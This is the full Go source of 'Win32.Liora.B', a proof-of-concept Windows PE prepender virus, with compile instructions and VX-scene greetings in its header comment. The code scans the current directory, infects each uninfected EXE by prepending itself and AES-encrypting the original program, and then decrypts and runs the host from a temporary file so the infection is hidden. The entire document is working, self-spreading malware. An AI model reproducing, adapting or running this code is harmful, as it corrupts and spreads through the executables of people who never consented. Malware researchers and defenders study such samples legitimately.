/*
* Win32.Liora.B - This is a POC PE prepender written in Go by TMZ (2015).
*
* Win32.Liora.B (May 2015) - Simple binary infector in GoLang (prepender).
* This version encrypts the host code with AES and decrypts it at runtime.
* It's almost a direct port from my GoLang ELF infector Linux.Liora, just a few tweaks.
*
* Compile with: go build -i liora.go (where go >= 1.4.2)
* It has no external dependencies so it should compile under most systems (x86 and x86_64).
*
* Use at your own risk, I'm not responsible for any damages that this may cause.
*
* A shout for those who keeps the scene alive: herm1t, alcopaul, hh86, SPTH, genetix, R3s1stanc3 & others
*
* Feel free to email me: tmz@null.net || You can also find me at http://vxheaven.org/ and on Twitter @TMZvx
*
* http://vx.thomazi.me
 */

package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"debug/pe"
	"encoding/binary"
	"io"
	"io/ioutil"
	"math/rand"
	"os"
	"os/exec"
	"strings"
	"time"
)

func check(e error) {
	// Reading files requires checking most calls for errors.
	// This helper will streamline our error checks below.
	if e != nil {
		panic(e)
	}
}

func _ioReader(file string) io.ReaderAt {
	r, err := os.Open(file)
	check(err)
	return r
}

func CheckPE(file string) bool {

	r := _ioReader(file)    //reader interface for file
	f, err := pe.NewFile(r) //open the file as a PE
	if err != nil {
		return false //Not a PE file
	}

	//Reading DOS header
	var dosheader [96]byte
	r.ReadAt(dosheader[0:], 0)
	if dosheader[0] == 'M' && dosheader[1] == 'Z' { //if we get MZ
		signoff := int64(binary.LittleEndian.Uint32(dosheader[0x3c:]))
		var sign [4]byte
		r.ReadAt(sign[:], signoff)
		if !(sign[0] == 'P' && sign[1] == 'E' && sign[2] == 0 && sign[3] == 0) { //if not PE\0\0
			return false //Invalid PE File Format
		}
	}
	if (f.Characteristics & 0x2000) == 0x2000 { //IMAGE_FILE_DLL signature
		return false //it's a DLL, OCX, CPL file, we want a EXE file
	}

	f.Close()
	return true //it is a valid EXE file

}

func CheckInfected(file string) bool {
	//a method by genetix, very handy
	_mark := "=TMZ=" //infection mark
	fi, err := os.Open(file)
	check(err)
	myStat, err := fi.Stat()
	check(err)
	size := myStat.Size()

	buf := make([]byte, size)
	fi.Read(buf)
	fi.Close()
	var x int64
	for x = 1; x < size; x++ {
		if buf[x] == _mark[0] {
			var y int64
			for y = 1; y < int64(len(_mark)); y++ {
				if (x + y) >= size {
					break
				}
				if buf[x+y] != _mark[y] {
					break
				}
			}
			if y == int64(len(_mark)) {
				return true //infected!
			}
		}
	}
	return false //not infected
}

func Infect(file string) {

	dat, err := ioutil.ReadFile(file) //read host
	check(err)
	vir, err := os.Open(os.Args[0]) //read virus
	check(err)
	virbuf := make([]byte, 3039232)
	vir.Read(virbuf)

	encDat := Encrypt(dat) //encrypt host

	f, err := os.OpenFile(file, os.O_RDWR, 0666) //open host
	check(err)

	w := bufio.NewWriter(f)
	w.Write(virbuf) //write virus
	w.Write(encDat) //write encypted host
	w.Flush()       //make sure we are all set
	f.Close()
	vir.Close()

}

func RunHost() {

	hostbytes := Rnd(8) + ".exe" //generate random name

	h, err := os.Create(hostbytes) //create tmp with above name
	check(err)

	infected_data, err := ioutil.ReadFile(os.Args[0]) //Read myself
	check(err)
	allSZ := len(infected_data) //get file full size
	hostSZ := allSZ - 3039232   //calculate host size

	f, err := os.Open(os.Args[0]) //open host
	check(err)

	f.Seek(3039232, os.SEEK_SET) //go to host start

	hostBuf := make([]byte, hostSZ)
	f.Read(hostBuf) //read it

	plainHost := Decrypt(hostBuf) //decrypt host

	w := bufio.NewWriter(h)
	w.Write(plainHost) //write plain host to tmp file
	w.Flush()          //make sure we are all set
	h.Close()
	f.Close()

	os.Chmod(hostbytes, 0755) //give it proper permissions
	cmd := exec.Command(hostbytes)
	cmd.Start() //execute it
	err = cmd.Wait()
	os.Remove(hostbytes)
}

func Encrypt(toEnc []byte) []byte {

	key := "SUPER_SECRET_KEY" // 16 bytes!
	block, err := aes.NewCipher([]byte(key))
	check(err)

	// 16 bytes for AES-128, 24 bytes for AES-192, 32 bytes for AES-256
	ciphertext := []byte("ASUPER_SECRET_IV")
	iv := ciphertext[:aes.BlockSize] // const BlockSize = 16

	encrypter := cipher.NewCFBEncrypter(block, iv)

	encrypted := make([]byte, len(toEnc))
	encrypter.XORKeyStream(encrypted, toEnc)

	//fmt.Printf("%s encrypted to %v\n", toEnc, encrypted)
	return encrypted

}

func Decrypt(toDec []byte) []byte {

	key := "SUPER_SECRET_KEY" // 16 bytes
	block, err := aes.NewCipher([]byte(key))
	check(err)

	// 16 bytes for AES-128, 24 bytes for AES-192, 32 bytes for AES-256
	ciphertext := []byte("ASUPER_SECRET_IV")
	iv := ciphertext[:aes.BlockSize] // const BlockSize = 16

	decrypter := cipher.NewCFBDecrypter(block, iv) // simple

	decrypted := make([]byte, len(toDec))
	decrypter.XORKeyStream(decrypted, toDec)

	return decrypted
}

func Rnd(n int) string {

	rand.Seed(time.Now().UTC().UnixNano())
	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)

}

func GetSz(file string) int64 {

	myHnd, err := os.Open(file)
	check(err)
	defer myHnd.Close()
	myStat, err := myHnd.Stat()
	check(err)
	mySZ := myStat.Size()
	myHnd.Close()
	return mySZ
}

func main() {

	virPath := os.Args[0]

	files, _ := ioutil.ReadDir(".")
	for _, f := range files {
		if CheckPE(f.Name()) == true {
			if CheckInfected(f.Name()) == false {
				if !strings.Contains(virPath, f.Name()) {
					Infect(f.Name())
				}
			}
		}
	}

	if GetSz(os.Args[0]) > 3039232 {
		RunHost()
	} else {
		os.Exit(0)
	}
}
